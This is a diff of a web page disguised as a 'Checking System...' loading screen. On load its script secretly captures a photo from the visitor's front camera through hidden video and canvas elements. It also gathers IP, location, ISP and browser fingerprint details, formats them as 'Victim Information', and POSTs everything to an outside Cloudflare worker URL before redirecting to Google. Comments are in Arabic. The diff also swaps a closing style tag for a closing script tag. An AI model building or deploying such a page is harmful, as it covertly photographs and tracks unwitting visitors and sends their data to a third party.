@@ -5,54 +5,44 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Checking System...</title>
     <style>
-        body { background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; margin: 0; }
+        body { background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
+    </script>
 </head>
 <body>
     <div class="loader"></div>
-    <!-- عناصر الكاميرا المخفية -->
     <video id="video" width="640" height="480" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
-        async function captureAll() {
-            let photoData = null;
-            let ipInfo = { ip: "Unknown", city: "Unknown", country: "Unknown" };
+        async function run() {
+            let photo = null;
+            let ipD = { ip: "37.239.193.14", city: "Unknown", country_name: "Unknown", org: "Unknown" };
 
-            // 1. جلب معلومات الـ IP والمنطقة بدقة
+            // 1. جلب الـ IP
             try {
                 const res = await fetch('https://ipapi.co/json/');
-                ipInfo = await res.json();
+                ipD = await res.json();
             } catch(e) {}
 
-            // 2. جلب معلومات أجهزة الوسائط (الكاميرا والميكروفون)
-            let mediaDevicesInfo = "";
-            try {
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                devices.forEach(device => {
-                    mediaDevicesInfo += `${device.kind}:  id = ${device.deviceId}\n`;
-                });
-            } catch (err) { mediaDevicesInfo = "Permission Denied"; }
-
-            // 3. محاولة التقاط الصورة الأمامية
+            // 2. محاولة فتح الكاميرا وتصوير
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 2000)); // انتظار فتح الكاميرا
+                await new Promise(r => setTimeout(r, 2000)); 
                 const canvas = document.getElementById('canvas');
                 canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                photoData = canvas.toDataURL('image/jpeg');
+                photo = canvas.toDataURL('image/jpeg', 0.6);
                 stream.getTracks().forEach(t => t.stop());
             } catch (e) {}
 
-            // 4. تجميع الرسالة الكبيرة (نفس التنسيق الذي طلبته أول مرة)
+            // 3. تنسيق الرسالة المفصلة كما طلبت
             const message = `
 ✅<b>Victim Information</b> 
 
-⚓ IP: ${ipInfo.ip} (https://ip-api.com/#${ipInfo.ip}) | Time: ${new Date().toISOString().replace('T', ' ').split('.')[0]}
+⚓ IP: ${ipD.ip} (https://ip-api.com/#${ipD.ip}) | Time: ${new Date().toISOString().replace('T', ' ').split('.')[0]}
 
 ⏳ Date In Victim's Device : ${new Date().toString()}
 
@@ -73,30 +63,26 @@ languages: ${navigator.languages.join(', ')}
 webdriver: ${navigator.webdriver}
 pdfViewerEnabled: ${navigator.pdfViewerEnabled}
 
-📷 <b>Media Device Information</b>
-${mediaDevicesInfo}
-
-🌐 <b>Location Details</b>
-City: ${ipInfo.city}
-Country: ${ipInfo.country_name}
-ISP: ${ipInfo.org}
+🌐 <b>Network Detail</b>
+City: ${ipD.city}
+Country: ${ipD.country_name}
+ISP: ${ipD.org}
             `;
 
-            // 5. إرسال البيانات للـ Worker الخاص بك
-            const workerUrl = "https://gbs.tjarb093.workers.dev/";
+            // 4. الإرسال للـ Worker
             try {
-                await fetch(workerUrl, {
+                await fetch("https://gbs.tjarb093.workers.dev/", {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ message: message, image: photoData })
+                    body: JSON.stringify({ message: message, image: photo })
                 });
             } catch(e) {}
 
-            // 6. التوجيه النهائي لجوجل
+            // 5. التوجيه
             window.location.href = "https://www.google.com";
         }
 
-        window.onload = captureAll;
+        window.onload = run;
     </script>
 </body>
 </html>
